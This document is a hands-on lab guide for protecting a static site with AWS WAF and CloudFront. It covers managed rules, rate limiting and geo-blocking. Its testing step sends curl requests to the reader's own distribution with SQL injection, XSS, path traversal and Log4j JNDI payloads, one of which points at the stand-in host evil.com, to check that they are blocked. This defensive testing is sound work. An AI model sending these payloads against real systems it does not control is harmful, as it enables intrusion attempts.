# AWS WAF and CloudFront: Secure Static Websites with Edge Protection, OWASP Defense, and DDoS Mitigation (Hands-On Lab)

[![AWS](https://img.shields.io/badge/AWS-Security-FF9900?logo=amazon-aws)](https://aws.amazon.com/security/)
[![WAF](https://img.shields.io/badge/Service-WAF-blue)](https://aws.amazon.com/waf/)
[![CloudFront](https://img.shields.io/badge/Service-CloudFront-green)](https://aws.amazon.com/cloudfront/)
[![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-yellow)]()
[![Duration](https://img.shields.io/badge/Duration-25%20mins-lightgrey)]()

> **Security Engineering on AWS** - Hands-on Lab Series
> **Level:** Intermediate | **Time:** 25 minutes | **Cost:** ~$6.60/month

---

Web applications face constant threats from automated attacks, malicious bots, and sophisticated exploits. AWS WAF (Web Application Firewall) integrated with Amazon CloudFront provides edge-level protection that blocks attacks before they ever reach your origin. This hands-on lab teaches you how to implement production-grade security for static websites using AWS managed rules, rate limiting, and geo-blocking—the same architecture used by enterprises serving millions of users.

---

## Table of Contents

- [What Are We Building Today?](#what-are-we-building-today)
- [Security Overview](#security-overview)
- [Why Is This Important?](#why-is-this-important)
- [AWS WAF Fundamentals](#aws-waf-fundamentals)
- [AWS Services Used](#aws-services-used)
- [Architecture Overview](#architecture-overview)
- [Prerequisites](#prerequisites)
- [Hands-On Tasks](#hands-on-tasks)
  - [Task 1: Create AWS WAF Web ACL with Managed Rules](#task-1-create-aws-waf-web-acl-with-managed-rules-8-mins)
  - [Task 2: Attach WAF to CloudFront Distribution](#task-2-attach-waf-to-cloudfront-distribution-5-mins)
  - [Task 3: Add Rate Limiting for DDoS Protection](#task-3-add-rate-limiting-for-ddos-protection-5-mins)
  - [Task 4: Test WAF Protection Against Attacks](#task-4-test-waf-protection-against-attacks-5-mins)
  - [Task 5: Configure Geo-Blocking (Optional)](#task-5-configure-geo-blocking-optional-2-mins)
- [Cost Breakdown](#cost-breakdown)
- [What We Learned Today](#what-we-learned-today)
- [Best Practices](#best-practices)
- [AWS Well-Architected Alignment](#aws-well-architected-alignment)
- [Troubleshooting](#troubleshooting)
- [Cleanup](#cleanup)
- [Next Steps](#next-steps)
- [AWS Documentation References](#aws-documentation-references)

---

## What Are We Building Today?

In this lab, we build **production-grade edge security** for static websites using AWS WAF and CloudFront:

| Task | What You'll Build | Key Concepts | Security Benefit |
|------|-------------------|--------------|------------------|
| **Task 1** | WAF Web ACL with managed rules | OWASP protection, managed rule groups | Block SQL injection, XSS, and known exploits |
| **Task 2** | CloudFront-WAF integration | Edge filtering, global protection | Attacks blocked before reaching origin |
| **Task 3** | Rate limiting rules | DDoS mitigation, abuse prevention | Automatic throttling of abusive IPs |
| **Task 4** | Attack simulation testing | Validation, security verification | Confirm protection is working |
| **Task 5** | Geo-blocking rules | Traffic restrictions, compliance | Block traffic from specific countries |

By the end, you'll understand how to:
- Create and configure AWS WAF Web ACLs for CloudFront
- Implement AWS Managed Rule Sets for OWASP Top 10 protection
- Set up rate-based rules to prevent DDoS and abuse
- Configure geo-blocking for traffic restrictions
- Test and validate WAF protection against real attack patterns
- Monitor blocked requests using CloudWatch metrics

---

## Security Overview

This lab addresses critical security controls required by modern compliance frameworks:

| Framework | Requirement | How This Lab Addresses It |
|-----------|-------------|---------------------------|
| **PCI-DSS** | 6.6 - Web application firewall | AWS WAF with managed rules |
| **PCI-DSS** | 11.4 - Intrusion detection | WAF logging and CloudWatch alerts |
| **HIPAA** | 164.312(e)(1) - Transmission security | HTTPS + WAF filtering |
| **SOC2** | CC6.6 - Boundary protection | Edge-level request filtering |
| **NIST 800-53** | SC-7 - Boundary protection | WAF as network boundary control |
| **OWASP** | Top 10 vulnerabilities | AWS Managed Rules coverage |

### Defense in Depth Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SECURITY LAYERS IN THIS LAB                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Layer 1: EDGE PROTECTION (CloudFront)                                  │
│  ├── Global CDN with 400+ edge locations                                │
│  ├── HTTPS/TLS termination (TLS 1.2+ enforced)                          │
│  ├── AWS Shield Standard (automatic DDoS protection)                    │
│  └── Geographic distribution reduces attack surface                     │
│                                                                          │
│  Layer 2: WEB APPLICATION FIREWALL (AWS WAF)                            │
│  ├── OWASP Top 10 protection (SQLi, XSS, LFI, RFI)                      │
│  ├── Known bad inputs blocking (Log4j, Java deserialization)            │
│  ├── Rate limiting per IP address                                       │
│  └── Geo-blocking for compliance requirements                           │
│                                                                          │
│  Layer 3: ORIGIN PROTECTION                                             │
│  ├── Origin Access Identity (OAI) - S3 only accessible via CloudFront   │
│  ├── S3 Block Public Access enabled                                     │
│  └── Bucket policy restricts to CloudFront only                         │
│                                                                          │
│  Layer 4: MONITORING & AUDIT                                            │
│  ├── CloudWatch metrics for allowed/blocked requests                    │
│  ├── WAF logs to S3/CloudWatch Logs                                     │
│  ├── CloudTrail for API auditing                                        │
│  └── Real-time alerting on anomalies                                    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Why Is This Important?

### The Problem with Unprotected Web Applications

| Challenge | Risk | WAF Solution |
|-----------|------|--------------|
| SQL injection attacks | Database breach, data theft | Pattern matching blocks SQLi payloads |
| Cross-site scripting (XSS) | Session hijacking, defacement | XSS signature detection and blocking |
| Automated bot attacks | Scraping, credential stuffing | Rate limiting and bot signatures |
| DDoS attacks | Service unavailability | Rate-based rules, Shield integration |
| Zero-day exploits | Unknown vulnerabilities | AWS managed rules updated automatically |
| Geographic compliance | Data residency violations | Geo-blocking by country |

### Real-World Use Cases

- **E-commerce Sites**: Protect checkout flows from injection attacks
- **SaaS Applications**: Prevent API abuse and credential stuffing
- **Media/Content Sites**: Block scraping bots and bandwidth theft
- **Financial Services**: Meet PCI-DSS WAF requirements
- **Healthcare Portals**: HIPAA-compliant patient data protection
- **Government Sites**: Geo-block traffic from adversarial nations

### Attack Statistics (Why This Matters)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WEB APPLICATION ATTACK LANDSCAPE                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  📊 43% of cyber attacks target web applications                        │
│  📊 SQL injection remains in OWASP Top 10 for 20+ years                 │
│  📊 Average cost of a data breach: $4.45 million (2023)                 │
│  📊 Bot traffic accounts for 47% of all internet traffic                │
│  📊 DDoS attacks increased 150% year-over-year                          │
│                                                                          │
│  💡 AWS WAF blocks these attacks at the edge for ~$6.60/month           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## AWS WAF Fundamentals

### What is AWS WAF?

AWS WAF is a web application firewall that lets you monitor HTTP(S) requests forwarded to your protected web application resources. You can protect:

- Amazon CloudFront distributions
- Amazon API Gateway REST APIs
- Application Load Balancers
- AWS AppSync GraphQL APIs
- Amazon Cognito user pools

### Key Concepts

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        AWS WAF COMPONENTS                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  WEB ACL (Web Access Control List)                                      │
│  ├── Container for rules that define inspection criteria                │
│  ├── Associated with CloudFront, ALB, API Gateway, etc.                 │
│  ├── Default action: ALLOW or BLOCK                                     │
│  └── Rules evaluated in priority order                                  │
│                                                                          │
│  RULES                                                                   │
│  ├── Regular rules: Match conditions → Action                           │
│  ├── Rate-based rules: Request count threshold → Action                 │
│  └── Rule groups: Reusable collections of rules                         │
│                                                                          │
│  MANAGED RULE GROUPS                                                     │
│  ├── AWS Managed Rules: Pre-configured by AWS security team             │
│  ├── Marketplace Rules: Third-party security vendors                    │
│  └── Updated automatically as threats evolve                            │
│                                                                          │
│  ACTIONS                                                                 │
│  ├── ALLOW: Permit the request                                          │
│  ├── BLOCK: Deny the request (403 Forbidden)                            │
│  ├── COUNT: Count but don't block (for testing)                         │
│  └── CAPTCHA: Challenge suspicious requests                             │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### AWS Managed Rule Groups

| Rule Group | What It Protects Against | Included Protections |
|------------|--------------------------|----------------------|
| **AWSManagedRulesCommonRuleSet** | OWASP Top 10 | XSS, SQLi, LFI, RFI, command injection |
| **AWSManagedRulesKnownBadInputsRuleSet** | Known exploits | Log4j, Java deserialization, host header attacks |
| **AWSManagedRulesSQLiRuleSet** | SQL injection | Advanced SQLi patterns, bypass attempts |
| **AWSManagedRulesLinuxRuleSet** | Linux exploits | LFI patterns targeting /etc/passwd, etc. |
| **AWSManagedRulesAmazonIpReputationList** | Malicious IPs | Bots, scanners, known bad actors |
| **AWSManagedRulesBotControlRuleSet** | Bot traffic | Scrapers, crawlers, automated tools |

---

## AWS Services Used

This lab uses four AWS services working together to secure your static website:

| Service | Purpose | What It Does |
|---------|---------|--------------|
| **AWS WAF** | Web Application Firewall | Filters malicious requests at the edge |
| **Amazon CloudFront** | Content Delivery Network | Global distribution with HTTPS termination |
| **Amazon S3** | Origin Storage | Hosts static website content (private) |
| **Amazon CloudWatch** | Monitoring | Tracks WAF metrics and blocked requests |

### Service Integration Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SERVICE INTEGRATION FLOW                              │
└─────────────────────────────────────────────────────────────────────────┘

     Internet User
          │
          │ HTTPS Request
          ▼
    ┌───────────────┐
    │  CloudFront   │◄──── TLS Termination
    │  Edge Location│      AWS Shield Standard
    └───────┬───────┘
            │
            │ Every Request
            ▼
    ┌───────────────┐
    │   AWS WAF     │◄──── Rule Evaluation
    │   Web ACL     │      Managed Rules
    └───────┬───────┘      Rate Limiting
            │
      ┌─────┴─────┐
      │           │
      ▼           ▼
  ┌───────┐   ┌───────┐
  │ BLOCK │   │ ALLOW │
  │ (403) │   │       │
  └───────┘   └───┬───┘
                  │
                  ▼
          ┌───────────────┐
          │  CloudFront   │◄──── Cache Check
          │  Cache        │
          └───────┬───────┘
                  │
                  │ Cache Miss
                  ▼
          ┌───────────────┐
          │   Amazon S3   │◄──── Origin Access Identity
          │   (Private)   │      Bucket Policy
          └───────────────┘
```

---

## Architecture Overview

### Before WAF (Vulnerable)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    BEFORE: UNPROTECTED ARCHITECTURE                      │
└─────────────────────────────────────────────────────────────────────────┘

    ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
    │ Legitimate   │   │  Attackers   │   │    Bots      │
    │   Users      │   │  (SQLi/XSS)  │   │  (Scrapers)  │
    └──────┬───────┘   └──────┬───────┘   └──────┬───────┘
           │                  │                  │
           └──────────────────┼──────────────────┘
                              │
                              │ ALL TRAFFIC PASSES THROUGH
                              ▼
                    ┌───────────────────┐
                    │    CloudFront     │
                    │  (No Filtering)   │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │     Amazon S3     │◄──── Receives attack traffic
                    │                   │      Bandwidth consumed
                    └───────────────────┘      No protection

    ❌ SQL injection reaches origin
    ❌ XSS payloads served to users
    ❌ Bots scrape all content
    ❌ DDoS consumes bandwidth
    ❌ No visibility into attacks
```

### After WAF (Protected)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    AFTER: PROTECTED ARCHITECTURE                         │
└─────────────────────────────────────────────────────────────────────────┘

    ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
    │ Legitimate   │   │  Attackers   │   │    Bots      │
    │   Users      │   │  (SQLi/XSS)  │   │  (Scrapers)  │
    └──────┬───────┘   └──────┬───────┘   └──────┬───────┘
           │                  │                  │
           └──────────────────┼──────────────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │    CloudFront     │
                    │   Edge Location   │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │     AWS WAF       │
                    │  ┌─────────────┐  │
                    │  │ Rule Check: │  │
                    │  │ • SQLi      │  │
                    │  │ • XSS       │  │
                    │  │ • Rate Limit│  │
                    │  │ • Geo Block │  │
                    │  └─────────────┘  │
                    └─────────┬─────────┘
                              │
              ┌───────────────┼───────────────┐
              │               │               │
              ▼               ▼               ▼
        ┌──────────┐   ┌──────────┐   ┌──────────┐
        │  BLOCK   │   │  BLOCK   │   │  ALLOW   │
        │ Attackers│   │   Bots   │   │  Users   │
        │  (403)   │   │  (403)   │   │          │
        └──────────┘   └──────────┘   └────┬─────┘
                                           │
                                           ▼
                                 ┌───────────────────┐
                                 │     Amazon S3     │
                                 │  (Clean Traffic)  │
                                 └───────────────────┘

    ✅ SQL injection blocked at edge
    ✅ XSS payloads never reach origin
    ✅ Bots rate-limited and blocked
    ✅ DDoS mitigated automatically
    ✅ Full visibility in CloudWatch
```

---

## Prerequisites

Before starting, ensure you have:

- [ ] AWS CLI installed and configured (`aws --version`)
- [ ] AWS account with admin permissions
- [ ] Existing CloudFront distribution (or S3 static website)
- [ ] `jq` installed for JSON processing (`jq --version`)
- [ ] Basic understanding of HTTP and web security

**Verify your setup:**

```bash
# Check AWS CLI
aws --version

# Verify credentials
aws sts get-caller-identity

# Check jq
jq --version

# List your CloudFront distributions
aws cloudfront list-distributions \
  --query 'DistributionList.Items[*].[Id,DomainName,Status]' \
  --output table
```

---

## Hands-On Tasks

### Task 1: Create AWS WAF Web ACL with Managed Rules (8 mins)

**Objective:** Create a Web ACL with AWS Managed Rules for OWASP protection.

> **Important:** CloudFront requires WAF resources in **us-east-1** (Global scope).

#### Step 1.1: Create Web ACL with Common Rule Set

```bash
# Create Web ACL with AWS Managed Rules
aws wafv2 create-web-acl \
  --name static-site-waf \
  --scope CLOUDFRONT \
  --default-action Allow={} \
  --description "WAF for static website protection" \
  --visibility-config \
    SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=StaticSiteWAF \
  --rules '[
    {
      "Name": "AWS-AWSManagedRulesCommonRuleSet",
      "Priority": 1,
      "Statement": {
        "ManagedRuleGroupStatement": {
          "VendorName": "AWS",
          "Name": "AWSManagedRulesCommonRuleSet"
        }
      },
      "OverrideAction": { "None": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AWSCommonRules"
      }
    },
    {
      "Name": "AWS-AWSManagedRulesKnownBadInputsRuleSet",
      "Priority": 2,
      "Statement": {
        "ManagedRuleGroupStatement": {
          "VendorName": "AWS",
          "Name": "AWSManagedRulesKnownBadInputsRuleSet"
        }
      },
      "OverrideAction": { "None": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AWSKnownBadInputs"
      }
    }
  ]' \
  --region us-east-1
```

**What this creates:**
- Web ACL named `static-site-waf`
- **AWSManagedRulesCommonRuleSet**: Blocks OWASP Top 10 attacks
- **AWSManagedRulesKnownBadInputsRuleSet**: Blocks Log4j, Java exploits
- CloudWatch metrics enabled for monitoring

#### Step 1.2: Get Web ACL ARN

```bash
# Store the Web ACL ARN for later use
WAF_ARN=$(aws wafv2 list-web-acls \
  --scope CLOUDFRONT \
  --region us-east-1 \
  --query 'WebACLs[?Name==`static-site-waf`].ARN' \
  --output text)

echo "Web ACL ARN: $WAF_ARN"
```

#### Step 1.3: Verify Web ACL Creation

```bash
# List rules in the Web ACL
aws wafv2 get-web-acl \
  --scope CLOUDFRONT \
  --name static-site-waf \
  --id $(aws wafv2 list-web-acls --scope CLOUDFRONT --region us-east-1 \
    --query 'WebACLs[?Name==`static-site-waf`].Id' --output text) \
  --region us-east-1 \
  --query 'WebACL.Rules[*].Name'
```

**Expected output:**
```json
[
    "AWS-AWSManagedRulesCommonRuleSet",
    "AWS-AWSManagedRulesKnownBadInputsRuleSet"
]
```

---

### Task 2: Attach WAF to CloudFront Distribution (5 mins)

**Objective:** Associate the WAF Web ACL with your CloudFront distribution.

#### Step 2.1: Set Your Distribution ID

```bash
# Set your CloudFront distribution ID
export CF_ID="YOUR_DISTRIBUTION_ID"

# Verify it exists
aws cloudfront get-distribution --id "$CF_ID" \
  --query 'Distribution.{Id:Id,Domain:DomainName,Status:Status}'
```

#### Step 2.2: Get Current Configuration

```bash
# Download current distribution config
aws cloudfront get-distribution-config --id "$CF_ID" > /tmp/cf-config.json

# Extract ETag (required for updates)
ETAG=$(jq -r '.ETag' /tmp/cf-config.json)
echo "ETag: $ETAG"

# Check current WAF association
jq -r '.DistributionConfig.WebACLId' /tmp/cf-config.json
```

#### Step 2.3: Add WAF to Distribution

```bash
# Add WebACLId to the distribution config
jq --arg waf "$WAF_ARN" '.DistributionConfig | .WebACLId = $waf' \
  /tmp/cf-config.json > /tmp/cf-config-with-waf.json

# Update the distribution
aws cloudfront update-distribution \
  --id "$CF_ID" \
  --if-match "$ETAG" \
  --distribution-config file:///tmp/cf-config-with-waf.json
```

#### Step 2.4: Wait for Deployment

```bash
# Check status (will show "InProgress" initially)
aws cloudfront get-distribution --id "$CF_ID" \
  --query 'Distribution.Status'

# Wait for deployment (5-15 minutes)
echo "Waiting for CloudFront deployment..."
aws cloudfront wait distribution-deployed --id "$CF_ID"
echo "✅ WAF successfully attached to CloudFront!"
```

#### Step 2.5: Verify WAF Association

```bash
# Confirm WAF is attached
aws cloudfront get-distribution --id "$CF_ID" \
  --query 'Distribution.DistributionConfig.WebACLId'
```

---

### Task 3: Add Rate Limiting for DDoS Protection (5 mins)

**Objective:** Add a rate-based rule to prevent DDoS and abuse.

#### Step 3.1: Get Current Web ACL Details

```bash
# Get Web ACL ID and lock token
WAF_ID=$(aws wafv2 list-web-acls --scope CLOUDFRONT --region us-east-1 \
  --query 'WebACLs[?Name==`static-site-waf`].Id' --output text)

LOCK_TOKEN=$(aws wafv2 get-web-acl \
  --name static-site-waf \
  --scope CLOUDFRONT \
  --id "$WAF_ID" \
  --region us-east-1 \
  --query 'LockToken' \
  --output text)

echo "WAF ID: $WAF_ID"
echo "Lock Token: $LOCK_TOKEN"
```

#### Step 3.2: Update Web ACL with Rate Limit Rule

```bash
# Get current rules
CURRENT_RULES=$(aws wafv2 get-web-acl \
  --name static-site-waf \
  --scope CLOUDFRONT \
  --id "$WAF_ID" \
  --region us-east-1 \
  --query 'WebACL.Rules')

# Add rate limit rule
UPDATED_RULES=$(echo "$CURRENT_RULES" | jq '. + [{
  "Name": "RateLimitRule",
  "Priority": 10,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 2000,
      "AggregateKeyType": "IP"
    }
  },
  "Action": { "Block": {} },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "RateLimitRule"
  }
}]')

# Update Web ACL
aws wafv2 update-web-acl \
  --name static-site-waf \
  --scope CLOUDFRONT \
  --id "$WAF_ID" \
  --lock-token "$LOCK_TOKEN" \
  --default-action Allow={} \
  --visibility-config \
    SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=StaticSiteWAF \
  --rules "$UPDATED_RULES" \
  --region us-east-1
```

**What this does:**
- Tracks requests per source IP address
- Blocks IPs exceeding **2000 requests per 5 minutes**
- Automatically unblocks when rate drops below threshold

---

### Task 4: Test WAF Protection Against Attacks (5 mins)

**Objective:** Verify WAF is blocking malicious requests.

#### Step 4.1: Get Your CloudFront Domain

```bash
# Get CloudFront domain
CF_DOMAIN=$(aws cloudfront get-distribution --id "$CF_ID" \
  --query 'Distribution.DomainName' --output text)

echo "Testing: https://$CF_DOMAIN"
```

#### Step 4.2: Test Normal Request (Should ALLOW)

```bash
# Normal request - should return 200
curl -s -o /dev/null -w "Normal Request: HTTP %{http_code}\n" \
  "https://$CF_DOMAIN/"
```

**Expected:** `Normal Request: HTTP 200`

#### Step 4.3: Test SQL Injection (Should BLOCK)

```bash
# SQL injection attempt - should return 403
curl -s -o /dev/null -w "SQLi Attack: HTTP %{http_code}\n" \
  "https://$CF_DOMAIN/?id=1'%20OR%20'1'='1"

# Another SQLi pattern
curl -s -o /dev/null -w "SQLi UNION: HTTP %{http_code}\n" \
  "https://$CF_DOMAIN/?id=1%20UNION%20SELECT%20*%20FROM%20users"
```

**Expected:** `SQLi Attack: HTTP 403`

#### Step 4.4: Test XSS Attack (Should BLOCK)

```bash
# XSS attempt - should return 403
curl -s -o /dev/null -w "XSS Attack: HTTP %{http_code}\n" \
  "https://$CF_DOMAIN/?q=%3Cscript%3Ealert('xss')%3C/script%3E"

# Another XSS pattern
curl -s -o /dev/null -w "XSS IMG: HTTP %{http_code}\n" \
  "https://$CF_DOMAIN/?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
```

**Expected:** `XSS Attack: HTTP 403`

#### Step 4.5: Test Path Traversal (Should BLOCK)

```bash
# Path traversal attempt - should return 403
curl -s -o /dev/null -w "Path Traversal: HTTP %{http_code}\n" \
  "https://$CF_DOMAIN/../../../etc/passwd"
```

**Expected:** `Path Traversal: HTTP 403`

#### Step 4.6: Test Log4j/JNDI Attack (Should BLOCK)

```bash
# Log4j JNDI attack - should return 403
curl -s -o /dev/null -w "Log4j Attack: HTTP %{http_code}\n" \
  "https://$CF_DOMAIN/" \
  -H "X-Api-Version: \${jndi:ldap://evil.com/a}"
```

**Expected:** `Log4j Attack: HTTP 403`

#### Step 4.7: View WAF Metrics

```bash
# Check blocked requests in CloudWatch
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 \
  --metric-name BlockedRequests \
  --dimensions Name=WebACL,Value=static-site-waf Name=Rule,Value=ALL \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u -v-1H +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 300 \
  --statistics Sum \
  --region us-east-1
```

---

### Task 5: Configure Geo-Blocking (Optional) (2 mins)

**Objective:** Block traffic from specific countries.

#### Step 5.1: Add Geo-Blocking Rule

```bash
# Get fresh lock token
LOCK_TOKEN=$(aws wafv2 get-web-acl \
  --name static-site-waf --scope CLOUDFRONT --id "$WAF_ID" \
  --region us-east-1 --query 'LockToken' --output text)

# Get current rules
CURRENT_RULES=$(aws wafv2 get-web-acl \
  --name static-site-waf --scope CLOUDFRONT --id "$WAF_ID" \
  --region us-east-1 --query 'WebACL.Rules')

# Add geo-blocking rule (example: block CN, RU, KP)
UPDATED_RULES=$(echo "$CURRENT_RULES" | jq '. + [{
  "Name": "GeoBlockRule",
  "Priority": 5,
  "Statement": {
    "GeoMatchStatement": {
      "CountryCodes": ["CN", "RU", "KP"]
    }
  },
  "Action": { "Block": {} },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "GeoBlockRule"
  }
}]')

# Update Web ACL
aws wafv2 update-web-acl \
  --name static-site-waf --scope CLOUDFRONT --id "$WAF_ID" \
  --lock-token "$LOCK_TOKEN" \
  --default-action Allow={} \
  --visibility-config \
    SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=StaticSiteWAF \
  --rules "$UPDATED_RULES" \
  --region us-east-1
```

**Country codes reference:** Use ISO 3166-1 alpha-2 codes (US, GB, DE, FR, etc.)

---

## Cost Breakdown

### Monthly Cost Estimate

| Resource | Unit Cost | Quantity | Monthly Cost |
|----------|-----------|----------|--------------|
| **Web ACL** | $5.00/month | 1 | $5.00 |
| **Rule (Rate Limit)** | $1.00/month | 1 | $1.00 |
| **Managed Rule Group (Common)** | Free with Web ACL | 1 | $0.00 |
| **Managed Rule Group (Bad Inputs)** | Free with Web ACL | 1 | $0.00 |
| **Request Processing** | $0.60/million | 1M | $0.60 |
| **CloudWatch Metrics** | Included | - | $0.00 |

**Total Monthly Cost: ~$6.60**

### Cost Comparison

| Protection Level | Monthly Cost | What You Get |
|------------------|--------------|--------------|
| No WAF | $0 | No protection |
| Basic (This Lab) | $6.60 | OWASP + Rate Limiting |
| Standard | $8.60 | + SQL Injection rules |
| Advanced | $18.60 | + Bot Control |
| Enterprise | $50+ | + Fraud Control |

### Cost of NOT Having WAF

| Incident | Potential Cost |
|----------|----------------|
| Data breach (average) | $4,450,000 |
| DDoS downtime (1 hour) | $10,000 - $100,000 |
| Compliance fine (PCI-DSS) | $5,000 - $100,000/month |
| Brand reputation damage | Incalculable |

**ROI:** $6.60/month vs. millions in potential breach costs.

---

## What We Learned Today

### Key Takeaways

| Concept | What You Learned |
|---------|------------------|
| **Web ACL** | Container for WAF rules, associated with CloudFront |
| **Managed Rules** | Pre-configured protection maintained by AWS |
| **Rate Limiting** | Automatic throttling based on request count per IP |
| **Geo-Blocking** | Traffic restriction by geographic location |
| **Edge Protection** | Attacks blocked before reaching origin |

### Skills Acquired

- ✅ Create and configure AWS WAF Web ACLs
- ✅ Implement AWS Managed Rule Sets
- ✅ Attach WAF to CloudFront distributions
- ✅ Configure rate-based rules for DDoS protection
- ✅ Set up geo-blocking for compliance
- ✅ Test and validate WAF protection
- ✅ Monitor blocked requests with CloudWatch

---

## Best Practices

### WAF Configuration

| Practice | Recommendation |
|----------|----------------|
| **Start with COUNT** | Test rules in COUNT mode before BLOCK |
| **Use Managed Rules** | Leverage AWS expertise, auto-updated |
| **Layer Your Rules** | Combine rate limits + managed rules + custom rules |
| **Monitor Metrics** | Set up CloudWatch alarms for anomalies |
| **Regular Reviews** | Audit rules and blocked requests monthly |

### Rule Priority

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    RECOMMENDED RULE PRIORITY ORDER                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Priority 1-10:   IP Reputation / Known Bad Actors                      │
│  Priority 11-20:  Rate Limiting Rules                                   │
│  Priority 21-30:  Geo-Blocking Rules                                    │
│  Priority 31-50:  AWS Managed Rules (OWASP, SQLi, XSS)                  │
│  Priority 51-70:  Custom Application Rules                              │
│  Priority 71+:    Allow Rules / Exceptions                              │
│                                                                          │
│  Lower priority number = evaluated first                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### What NOT to Do

| Anti-Pattern | Why It's Bad | Better Approach |
|--------------|--------------|-----------------|
| Block all then allow | High false positive risk | Allow all then block specific |
| Skip testing | Break legitimate users | Test in COUNT mode first |
| Ignore metrics | Miss attack patterns | Regular monitoring |
| Static configuration | Threats evolve | Use managed rules (auto-update) |
| Over-blocking | User experience suffers | Tune rules based on logs |

---

## AWS Well-Architected Alignment

### Security Pillar

| Best Practice | Implementation |
|---------------|----------------|
| **SEC01** - Implement strong identity foundation | IAM controls WAF management |
| **SEC02** - Enable traceability | CloudWatch metrics + WAF logs |
| **SEC03** - Apply security at all layers | Edge (WAF) + Origin (OAI) + Data (S3 encryption) |
| **SEC04** - Automate security best practices | Managed rules auto-update |
| **SEC05** - Protect data in transit | TLS 1.2+ via CloudFront |
| **SEC06** - Keep people away from data | OAI prevents direct S3 access |

### Operational Excellence Pillar

| Best Practice | Implementation |
|---------------|----------------|
| **OPS01** - Understand business needs | WAF protects revenue-generating assets |
| **OPS02** - Make frequent, reversible changes | Rule changes via API |
| **OPS03** - Refine operations procedures | Runbooks for WAF incidents |
| **OPS04** - Anticipate failure | Rate limiting prevents overload |
| **OPS05** - Learn from operational failures | Analyze blocked requests |

---

## Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| WAF not blocking | Rules in COUNT mode | Change to BLOCK mode |
| Legitimate users blocked | False positive | Add exception rule or tune threshold |
| High latency | Too many rules | Optimize rule count, use priorities |
| Can't delete Web ACL | Still associated | Disassociate from CloudFront first |
| 403 on all requests | Default action is BLOCK | Change to ALLOW with specific BLOCK rules |

### Debug Commands

```bash
# Check Web ACL rules
aws wafv2 get-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --region us-east-1 --query 'WebACL.Rules[*].Name'

# Check CloudFront WAF association
aws cloudfront get-distribution --id "$CF_ID" \
  --query 'Distribution.DistributionConfig.WebACLId'

# View sampled requests (blocked)
aws wafv2 get-sampled-requests \
  --web-acl-arn "$WAF_ARN" \
  --rule-metric-name AWSCommonRules \
  --scope CLOUDFRONT \
  --time-window StartTime=$(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ),EndTime=$(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --max-items 10 \
  --region us-east-1
```

---

## Cleanup

### Remove All Resources

```bash
# Step 1: Remove WAF from CloudFront
aws cloudfront get-distribution-config --id "$CF_ID" > /tmp/cf-config.json
ETAG=$(jq -r '.ETag' /tmp/cf-config.json)
jq '.DistributionConfig | .WebACLId = ""' /tmp/cf-config.json > /tmp/cf-no-waf.json
aws cloudfront update-distribution --id "$CF_ID" --if-match "$ETAG" \
  --distribution-config file:///tmp/cf-no-waf.json

# Wait for deployment
aws cloudfront wait distribution-deployed --id "$CF_ID"

# Step 2: Delete Web ACL
WAF_ID=$(aws wafv2 list-web-acls --scope CLOUDFRONT --region us-east-1 \
  --query 'WebACLs[?Name==`static-site-waf`].Id' --output text)
LOCK_TOKEN=$(aws wafv2 get-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --region us-east-1 --query 'LockToken' --output text)
aws wafv2 delete-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --lock-token "$LOCK_TOKEN" --region us-east-1

echo "✅ Cleanup complete!"
```

### Cost After Cleanup

| Resource | Status | Cost |
|----------|--------|------|
| Web ACL | Deleted | $0 |
| Rules | Deleted | $0 |
| CloudFront | Unchanged | Existing |
| S3 | Unchanged | Existing |

---

## Next Steps

### Recommended Follow-Up Labs

| Lab | Focus Area |
|-----|------------|
| **VPC Security** | Network isolation, NACLs, Security Groups |
| **GuardDuty** | Threat detection, anomaly monitoring |
| **Security Hub** | Compliance automation, findings aggregation |
| **IAM Access Analyzer** | Least privilege, external access detection |

### Production Enhancements

1. **Enable WAF Logging** to S3 or CloudWatch Logs
2. **Add Bot Control** managed rule group
3. **Create CloudWatch Alarms** for high block rates
